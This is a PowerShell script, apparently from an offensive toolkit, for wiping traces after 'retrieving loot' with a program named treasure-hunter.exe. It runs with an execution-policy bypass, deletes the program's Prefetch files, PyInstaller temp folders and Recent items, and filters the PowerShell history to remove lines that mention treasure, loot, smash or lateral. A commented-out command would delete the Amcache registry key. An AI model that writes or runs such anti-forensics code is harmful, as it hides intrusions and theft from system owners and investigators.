# POST-ENGAGEMENT CLEANUP
# Run after retrieving loot to remove forensic artifacts
# Usage: powershell -ep bypass -f cleanup.ps1 -ExeName "treasure-hunter.exe"

param(
    [string]$ExeName = "treasure-hunter.exe"
)

# Remove Prefetch entries (requires admin)
$prefetchPattern = ($ExeName -replace '\.exe$','').ToUpper() + '*.pf'
Get-ChildItem "C:\Windows\Prefetch" -Filter $prefetchPattern -ErrorAction SilentlyContinue | Remove-Item -Force

# Remove PyInstaller temp extraction folders
Get-ChildItem $env:TEMP -Directory -Filter "_MEI*" -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force

# Remove recent items referencing the exe
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -Filter "*treasure*" -ErrorAction SilentlyContinue | Remove-Item -Force

# Clear PowerShell history for current session
$histPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $histPath) {
    $lines = Get-Content $histPath | Where-Object { $_ -notmatch 'treasure|loot|smash|lateral' }
    $lines | Set-Content $histPath
}

# Remove Amcache entry (requires admin, risky)
# Uncomment only if you understand the forensic implications:
# reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AppCompatFlags\Amcache" /f 2>$null
